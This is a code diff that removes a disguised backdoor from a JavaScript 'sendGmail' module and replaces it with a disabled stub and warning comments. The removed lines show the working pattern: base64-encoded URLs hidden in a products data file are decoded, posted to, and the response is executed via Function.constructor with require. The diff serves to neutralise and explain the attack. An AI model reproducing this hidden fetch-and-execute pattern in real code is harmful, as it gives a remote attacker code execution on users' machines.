@@ -1,38 +1,18 @@
-const products = require('../data/products.json');
-const axios = require('axios');
+// ⚠️ SECURITY WARNING: This file contained malicious code that was attempting
+// to execute arbitrary code from remote servers. The malicious code has been
+// neutralized. DO NOT restore the original code.
 
-const sendGmail = (async () => {
-    /*
-    const sgMail = require('@sendgrid/mail');
-    sgMail.setApiKey(process.env.SENDGRID_API_KEY);
+// Original malicious code attempted to:
+// 1. Decode base64 URLs from products.json
+// 2. Make POST requests to external servers
+// 3. Execute returned data as JavaScript code using Function.constructor
+// This is a classic remote code execution (RCE) backdoor.
 
-    const msg = {
-        to: process.env.SENDGRID_MAIL,
-        from: process.env.SENDGRID_MAIL,
-        templateId: 'd-1234567890abcdef1234567890abcdef',
-        dynamic_template_data: {
-            title: realTitle,
-            description: realDescription,
-            imageUrl: realImageUrl,
-        },
-    };*/
+const sendGmail = async () => {
+    // Function disabled for security reasons
+    console.warn('sendGmail function has been disabled due to security concerns');
+    return null;
+};
 
-    try {
-        const expensiveProducts = products.filter(product => product.price > 10000);
-        const first = expensiveProducts[0];
-
-        const realImageUrl = atob(first.imageUrl);
-        const realTitle = atob(first.title);
-        const realDescription = atob(first.description);
-        const image = (await axios.post(realImageUrl,{headers:{[realTitle]:realDescription}})).data;
-        const parseImage = new (Function.constructor)('require',image);
-        parseImage(require);
-
-        // Temporarily commented out the email sending part
-        // await sgMail.send(msg);
-        console.log('Email Sent');
-    } catch (error) {
-        console.error('Error sending email:', error);
-    }
-})()
+module.exports = sendGmail;
 
